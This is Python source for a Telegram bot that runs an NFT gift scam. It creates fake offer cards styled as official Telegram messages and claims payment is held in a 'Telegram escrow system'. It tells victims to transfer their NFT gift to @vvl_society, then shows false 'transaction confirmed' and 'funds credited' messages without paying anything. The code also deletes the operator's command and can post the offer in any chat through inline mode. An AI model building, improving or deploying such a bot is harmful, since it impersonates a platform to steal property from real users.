import asyncio
import logging
import os
import re
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    CallbackQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineQuery,
    ChosenInlineResult,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}


# ================= ТЕКСТЫ =================
TEXTS = {
    "ru": {
        "usage": (
            "⚠️ Использование: `.buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
            "Пример: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
            "Для английского добавьте `eu` в конце."
        ),
        "invalid_link": (
            "⚠️ Неверная ссылка на NFT.\n"
            "Правильный формат: `https://t.me/nft/Название-Номер`"
        ),
        "header": "Telegram",
        "offer": "Пользователь предлагает вам",
        "for_gift": "за подарок",
        "valid_for": "Оффер действителен ещё 6 ч. 0 мин.",
        "decline_btn": "❌ Отклонить",
        "accept_btn": "✅ Принять",
        "declined": "❌ Предложение отклонено",
        "not_yours": "⚠️ Эта сделка не для вас.",
        "alert_title": (
            "Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
            "Нажмите «ОК», если вы прочитали это сообщение."
        ),
        "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
        "deal_title": "NFT Deal",
        "order": "Ордер",
        "buyer_reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу-систему Telegram.",
        "escrow_text": (
            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
        ),
        "instructions": "Инструкция для завершения сделки:",
        "step1": "1. Передайте подарок пользователю: @vvl_society",
        "step2_prefix": "2. Нажмите «Передать NFT» и выберите",
        "step3": "3. Подтвердите передачу подарка.",
        "link_to_gift": "Ссылка на подарок",
        "final_note": (
            "Telegram зафиксирует транзакцию и моментально зачислит "
            "{amount} {currency} на ваш баланс. Резерв действует 24 часа."
        ),
        "transfer_btn": "Передать NFT",
        "confirm_btn": "Подтвердить передачу",
        "confirmed": "✅ Транзакция подтверждена!",
        "deal_done": "✅ Сделка завершена. Средства зачислены на ваш баланс.",
        "inline_title": "NFT предложение",
        "inline_desc": "Нажмите чтобы отправить карточку",
    },
    "en": {
        "usage": (
            "⚠️ Usage: `.buy <NFT_link> <amount> <currency> [eu]`\n"
            "Example: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
        ),
        "invalid_link": "⚠️ Invalid NFT link.",
        "header": "Telegram",
        "offer": "A user offers you",
        "for_gift": "for the gift",
        "valid_for": "Offer is valid for another 6 h. 0 min.",
        "decline_btn": "❌ Decline",
        "accept_btn": "✅ Accept",
        "declined": "❌ Offer declined",
        "not_yours": "⚠️ This deal is not for you.",
        "alert_title": "Attention!\n\nFollow the instructions to receive payment.",
        "deal_lost": "⚠️ Error: deal data lost.",
        "deal_title": "NFT Deal",
        "order": "Order",
        "buyer_reserved": "The buyer has reserved",
        "via_escrow": "via the Telegram escrow system.",
        "escrow_text": "Funds are held in escrow and will be credited after the transfer.",
        "instructions": "Instructions:",
        "step1": "1. Transfer the gift to: @vvl_society",
        "step2_prefix": "2. Click «Transfer NFT» and choose",
        "step3": "3. Confirm the transfer.",
        "link_to_gift": "Gift link",
        "final_note": (
            "Telegram will credit {amount} {currency} to your balance. "
            "Reservation is valid 24 hours."
        ),
        "transfer_btn": "Transfer NFT",
        "confirm_btn": "Confirm transfer",
        "confirmed": "✅ Transaction confirmed!",
        "deal_done": "✅ Deal completed.",
        "inline_title": "NFT offer",
        "inline_desc": "Tap to send the card",
    },
}


def parse_nft_link(url):
    match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
    if not match:
        return None
    name = match.group(1)
    number = match.group(2)
    return {"name": name, "number": number, "full": f"{name} #{number}", "url": url}


def parse_buy_args(text):
    args = text.split()
    lang = "ru"
    if len(args) >= 2 and args[-1].lower() == "eu":
        lang = "en"
        args = args[:-1]

    # Если первое слово — команда (buy, /buy, .buy), убираем его
    if args and args[0].lower().lstrip("/.") == "buy":
        args = args[1:]

    if len(args) < 3:
        return None

    return lang, args[0], args[1], args[2].upper()


def build_offer_text(t, nft_title, amount, currency, nft_link):
    return (
        f"<b>{t['header']}</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"{t['offer']}\n"
        f"<b>{amount} {currency}</b> {t['for_gift']} {nft_link}.\n\n"
        f"{t['valid_for']}"
    )


def build_offer_keyboard(t, chat_id, user_id, lang):
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text=t["decline_btn"],
            callback_data=f"decline_{chat_id}_{user_id}_{lang}",
        ),
        InlineKeyboardButton(
            text=t["accept_btn"],
            callback_data=f"accept_{chat_id}_{user_id}_{lang}",
        ),
    )
    return builder


def build_final_text(t, deal):
    return (
        f"<b>{t['deal_title']}</b>\n\n"
        f"{t['order']} #TG-D721BSTP\n\n"
        f"{t['buyer_reserved']} <b>{deal['amount']} {deal['currency']}</b> "
        f"{t['via_escrow']}\n"
        f"{t['escrow_text']}\n\n"
        f"<b>{t['instructions']}</b>\n"
        f"{t['step1']}\n"
        f"{t['step2_prefix']} <b>{deal['title']}</b>\n"
        f"{t['step3']}\n\n"
        f"{t['link_to_gift']}: {deal['link']}\n\n"
        f"{t['final_note'].format(amount=deal['amount'], currency=deal['currency'])}"
    )


def build_final_keyboard(t, deal, chat_id, user_id, lang):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t["transfer_btn"], url=deal["link"]))
    builder.row(
        InlineKeyboardButton(
            text=t["confirm_btn"],
            callback_data=f"confirm_{chat_id}_{user_id}_{lang}",
        )
    )
    return builder


# ================= КОМАНДА .buy / /buy (личка с ботом) =================
@dp.message(Command("buy"))
@dp.message(F.text.startswith(".buy"))
async def cmd_buy_handler(message: types.Message):
    try:
        await message.delete()
    except Exception as e:
        logging.warning(f"Не удалось удалить сообщение: {e}")

    parsed = parse_buy_args(message.text)
    if not parsed:
        await message.answer(TEXTS["ru"]["usage"])
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        await message.answer(t["invalid_link"])
        return

    nft_title = nft_data["full"]
    deal_id = f"{message.chat.id}_{message.from_user.id}"
    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "lang": lang,
        "user_id": message.from_user.id,
        "chat_id": message.chat.id,
    }

    text = build_offer_text(t, nft_title, amount, currency, nft_link)
    builder = build_offer_keyboard(t, message.chat.id, message.from_user.id, lang)

    await message.answer(
        text=text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False,
    )


# ================= INLINE MODE (в любом чате) =================
@dp.inline_query()
async def inline_query_handler(query: InlineQuery):
    """Обработка запроса @bot <текст>"""
    text = (query.query or "").strip()

    if not text:
        # Пустой запрос — показываем подсказку
        t = TEXTS["ru"]
        result = InlineQueryResultArticle(
            id="usage",
            title="Использование",
            description="Ссылка + сумма + валюта",
            input_message_content=InputTextMessageContent(
                message_text=t["usage"]
            ),
        )
        await query.answer(results=[result], cache_time=1)
        return

    parsed = parse_buy_args(text)
    if not parsed:
        t = TEXTS["ru"]
        result = InlineQueryResultArticle(
            id="usage",
            title="⚠️ Неверный формат",
            description="Пример: https://t.me/nft/SnoopDogg-9203 1000 STARS",
            input_message_content=InputTextMessageContent(
                message_text=t["usage"]
            ),
        )
        await query.answer(results=[result], cache_time=1)
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        result = InlineQueryResultArticle(
            id="bad_link",
            title="⚠️ Неверная ссылка",
            description="Пример: https://t.me/nft/SnoopDogg-9203",
            input_message_content=InputTextMessageContent(
                message_text=t["invalid_link"]
            ),
        )
        await query.answer(results=[result], cache_time=1)
        return

    nft_title = nft_data["full"]

    # chat_id/user_id тут неизвестны, используем ID автора запроса
    chat_id = query.from_user.id
    user_id = query.from_user.id

    deal_id = f"{chat_id}_{user_id}"
    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "lang": lang,
        "user_id": user_id,
        "chat_id": chat_id,
    }

    text = build_offer_text(t, nft_title, amount, currency, nft_link)
    builder = build_offer_keyboard(t, chat_id, user_id, lang)

    # В Inline можно передавать reply_markup через InlineQueryResultArticle
    result = InlineQueryResultArticle(
        id=f"offer_{deal_id}",
        title=f"{t['inline_title']}: {nft_title}",
        description=f"{amount} {currency} — {t['inline_desc']}",
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode="HTML",
        ),
        reply_markup=builder.as_markup(),
    )

    await query.answer(results=[result], cache_time=1)


# ================= ОТКЛОНИТЬ =================
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]
    deal_user_id = parts[-2]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    try:
        await callback.message.edit_text(t["declined"])
    except Exception:
        pass
    await callback.answer()


# ================= ПРИНЯТЬ =================
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]
    deal_user_id = parts[-2]
    deal_chat_id = parts[-3]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.answer(text=t["alert_title"], show_alert=True)
    await asyncio.sleep(1.5)

    deal_id = f"{deal_chat_id}_{deal_user_id}"
    deal = active_deals.get(deal_id)
    if not deal:
        try:
            await callback.message.edit_text(t["deal_lost"])
        except Exception:
            pass
        return

    text = build_final_text(t, deal)
    builder = build_final_keyboard(t, deal, deal_chat_id, deal_user_id, lang)

    try:
        await callback.message.edit_text(
            text=text,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=False,
        )
    except Exception as e:
        logging.error(f"Ошибка edit: {e}")


# ================= ПОДТВЕРДИТЬ =================
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]
    deal_user_id = parts[-2]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.answer(t["confirmed"], show_alert=True)
    try:
        await callback.message.edit_text(t["deal_done"])
    except Exception:
        pass


# ================= ВЕБ-СЕРВЕР =================
async def handle(request):
    return web.Response(text="Bot is alive!")


async def main():
    logging.info("=== MAIN STARTED ===")
    port = int(os.environ.get("PORT", 10000))
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logging.info("=== WEB SERVER STARTED ===")

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())